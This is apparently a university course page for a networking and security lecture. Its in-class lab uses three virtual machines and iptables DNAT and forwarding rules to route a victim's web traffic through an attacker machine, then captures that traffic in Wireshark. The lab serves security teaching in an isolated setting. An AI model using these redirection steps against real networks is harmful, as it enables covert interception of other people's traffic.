---
layout: default
course_number: CS497
title: "Lecture 5: Computer Networking"
---

# Lecture 5

- Network Security
- Basic Internet technology
- TCP/IP
- Network models and ARP security
- Spoofing, sniffing, session hijacking
- Denial-of-service botnets

### Reading 

- Introduction to Computer Security: Chapter 5

### Slides

- [Computer Networking](Ch05-NetworkModelsARP.pdf)

### In Class Exercise (part 1)
- Startup VirtualBox and create three (3) virtual machines. 
- One is used to host applications (server) and other virtual machines are for the victim and the attacker.
- Once the network setup is done, run ```ifconfig``` on all VMs and record the IP address for each VM. Take a screenshot.
- **Normal Scenario:**
  - Create a folder in *Server* at ```~/testserver```.
  - Create a file named ```test.html``` in ```~/testserver``` with some text content. Take a screenshot.
  - Open a terminal window and change directory to ```~/testserver```, start a python SimpleHTTPServer with the following command 
  ```python -m SimpleHTTPServer```
  - Open a browser session in ```Victim’s``` VM and enter ```http://<server_ip_address>:8000/test.html``` in the URL bar. 
  - Observe that we get the expected response. Take a screenshot.
- **Victim to Attacker Link Scenario:**
  - Execute the following commands in ```Victim's``` VM and take a screenshot.
  ```
  sudo iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination attacker_ip_address
  sudo iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination attacker_ip_address
  sudo iptables -t nat -A OUTPUT -p tcp --dport 8000 -j DNAT --to-destination attacker_ip_address
  ```
  - Create a folder in *Attacker* at ```~/testserver```.
  - Create a file named ```test.html``` in ```~/testterver``` with some text content. Take a screenshot.
  - Open a terminal window and change directory to ```~/testserver```, start a python SimpleHTTPServer with the following command ```python -m SimpleHTTPServer```
  - In ```Victim’s``` VM refresh the browser and observe that we get the expected response. Take a screenshot.
- **Attacker to Server Link Scenario:**
  - Execute the following commands in ```Attacker's``` VM and take a screenshot.
  ```
  sudo sysctl -w net.ipv4.ip_forward=1
  sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination server_ip_address
  sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination server_ip_address
  sudo iptables -t nat -A PREROUTING -p tcp --dport 8000 -j DNAT --to-destination server_ip_address
  sudo iptables -t nat -A POSTROUTING -j MASQUERADE
  ```
  - Once above rules are in place, refresh the ```Victim’s``` browser and observe that we are getting the original response from the ```Server```. Take a screenshot. However, now all the traffic is routed through the ```Attacker’s``` network interface. 
  - Open up Wireshark in ```Attacker’s``` virtual machine (you might need to run Wireshark with sudo in order to get the interface list, if group permissions are not properly set). 
  - Select *enp0s3* as the interface and capture communication. *Interface name may vary.* 
  - Observe network traffic as you refresh the ```Victim's``` browser. Take a screenshot.
- To reset the iptables: ```sudo iptables -F```
- [iptables man pages](https://linux.die.net/man/8/iptables)
